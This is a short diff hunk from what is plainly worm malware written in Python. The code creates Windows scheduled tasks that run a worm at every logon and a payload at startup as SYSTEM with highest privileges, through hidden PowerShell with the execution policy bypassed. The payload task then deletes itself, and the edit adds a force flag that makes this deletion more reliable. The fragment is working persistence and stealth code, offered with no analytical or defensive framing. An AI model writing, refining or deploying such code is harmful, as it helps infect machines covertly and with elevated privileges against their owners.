@@ -48,7 +48,7 @@ def create_scheduled_tasks():
     worm_cmd = f'schtasks /create /tn {WORM_TASK_NAME} /tr "{WORM_PATH}" /sc onlogon /ru SYSTEM /rl HIGHEST /f'
     subprocess.run(worm_cmd, shell=True, capture_output=True)
     if not os.path.exists(FLAG_FILE):
-        payload_cmd = f'schtasks /create /tn {PAYLOAD_TASK_NAME} /tr "powershell.exe -nop -w hidden -ep bypass -c \\"{PAYLOAD_PATH};schtasks /delete /tn {PAYLOAD_TASK_NAME}\\"" /sc onstart /ru SYSTEM /rl HIGHEST /f'
+        payload_cmd = f'schtasks /create /tn {PAYLOAD_TASK_NAME} /tr "powershell.exe -nop -w hidden -ep bypass -c \\"{PAYLOAD_PATH};schtasks /delete /tn {PAYLOAD_TASK_NAME} /f\\"" /sc onstart /ru SYSTEM /rl HIGHEST /f'
         subprocess.run(payload_cmd, shell=True, capture_output=True)
         subprocess.run(f'schtasks /run /tn {PAYLOAD_TASK_NAME}', shell=True, capture_output=True)
         with open(FLAG_FILE, 'w') as f:
